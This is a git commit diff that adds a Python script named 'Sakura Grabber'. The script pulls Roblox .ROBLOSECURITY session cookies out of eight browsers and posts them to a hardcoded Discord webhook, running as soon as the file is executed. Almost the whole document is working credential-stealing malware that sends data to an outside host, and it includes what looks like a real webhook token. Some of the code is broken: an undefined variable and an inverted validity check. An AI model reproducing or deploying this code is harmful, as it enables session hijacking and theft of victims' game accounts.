12a1a2ae5dc4604f45587a0984544f0292c0468e
Zenxdkd <99894254+Zenxdkd@users.noreply.github.com>
2023-05-21 15:35:50 +0200

    Create main.py

---
+++ api/main.py
@@ -0,0 +1,103 @@
+webhook = "https://discord.com/api/webhooks/1094388993136803840/CYasTJ8RXQxKVyYnLIx_fGt8cGtcDv0ytLWVDi4lzICd-7vYIuUREflvlRxsP6StmXZu"
+
+try:
+    import robloxpy
+    import requests
+    import browser_cookie3
+
+except:
+    input("One Of The Packages Are Not Installed, Run 'Requirements.Bat' To Remove This Error!")
+    exit()
+
+def cookiecheckerandsend(cookie, platform):
+
+    if not robloxpy.Utils.CheckCookie(cookie) == "This Is A Valid Cookie":
+        return requests.post(url=webhook, data={"content":f"This Is A Valid Cookie!\n|| ```{cookie}``` ||"})
+
+    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
+
+    requests.post(url=webhook, json={
+        'username': "Sakura",
+        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
+        'embeds': [{
+                "title": f"Sakura Grabber - {platform}",
+                "description" : f"[Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
+                "color" : 12452044,
+                "fields": [
+                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": True},
+                ],
+                "footer": {
+                    "text": "Made By LeeWasTaken"
+                }
+            }
+        ]
+    }
+)
+
+def Sakura():
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Firefox')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.safari(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Safari')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Chromium')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Opera GX')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Opera')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.brave(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Brave')
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                cookiecheckerandsend(cookie.value, platform='Chrome')
+    except:
+        pass
+
+cookies = Sakura()
